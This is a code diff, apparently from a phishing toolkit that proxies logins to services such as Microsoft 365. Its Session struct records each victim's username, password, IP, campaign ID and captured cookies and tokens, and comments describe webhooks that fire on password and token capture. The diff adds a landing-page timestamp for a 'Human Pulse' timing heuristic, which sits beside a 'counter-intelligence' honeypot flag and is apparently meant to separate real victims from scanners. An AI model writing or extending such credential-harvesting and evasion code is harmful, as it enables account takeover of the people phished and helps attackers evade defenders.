@@ -88,24 +88,25 @@ func (w *RequestWindow) GetWindowStats(nowMS int64) (reqCount uint32, errCount u
 // ══════════════════════════════════════════════════════════
 
 type Session struct {
-	mu             sync.Mutex // guards the mutable fields below (concurrent capture paths)
-	ID             string
-	Index          int
-	IP             string
-	UserAgent      string
-	Username       string
-	Password       string
-	Domain         string
-	TargetName     string // which target this session belongs to (e.g. "Microsoft 365")
-	CampaignID     string // multi-tenancy: which operator campaign this victim came from (?cid=)
-	CreatedAt      time.Time
-	IsDone         bool
-	ReachedService bool              // set when the post-login chain reaches target.ServiceUpstream
-	PasswordSent   bool              // Event 1 (immediate password capture) webhook fired at least once
-	sentPassword   string            // last password sent in Event 1 — lets a retry overwrite a wrong password
-	CompleteSent   bool              // Event 2 (full capture w/ tokens) webhook already fired
-	CookieTokens   map[string]string // auth cookies/tokens captured after login
-	IsHoneypot     bool              // NEW: Flags this session as a counter-intelligence trap
+	mu                  sync.Mutex // guards the mutable fields below (concurrent capture paths)
+	ID                  string
+	Index               int
+	IP                  string
+	UserAgent           string
+	Username            string
+	Password            string
+	Domain              string
+	TargetName          string // which target this session belongs to (e.g. "Microsoft 365")
+	CampaignID          string // multi-tenancy: which operator campaign this victim came from (?cid=)
+	CreatedAt           time.Time
+	LandingPageServedAt time.Time // NEW: Used for the "Human Pulse" timing heuristic
+	IsDone              bool
+	ReachedService      bool              // set when the post-login chain reaches target.ServiceUpstream
+	PasswordSent        bool              // Event 1 (immediate password capture) webhook fired at least once
+	sentPassword        string            // last password sent in Event 1 — lets a retry overwrite a wrong password
+	CompleteSent        bool              // Event 2 (full capture w/ tokens) webhook already fired
+	CookieTokens        map[string]string // auth cookies/tokens captured after login
+	IsHoneypot          bool              // NEW: Flags this session as a counter-intelligence trap
 
 	// ── NEW: Behavioral Telemetry ──
 	ActivityWindow RequestWindow // Tracks the last 60 seconds of behavior (zero allocation)
@@ -145,6 +146,21 @@ func (s *Session) AddToken(name, value string) {
 		s.CookieTokens = make(map[string]string)
 	}
 	s.CookieTokens[name] = value
+}
+
+// SetLandingPageServedAt records the exact time the landing page was served to this session.
+// This is used later by the "Human Pulse" timing heuristic in capture.go.
+func (s *Session) SetLandingPageServedAt() {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	s.LandingPageServedAt = time.Now()
+}
+
+// GetLandingPageServedAt returns the time the landing page was served.
+func (s *Session) GetLandingPageServedAt() time.Time {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.LandingPageServedAt
 }
 
 // ── Two-event webhook gates ──
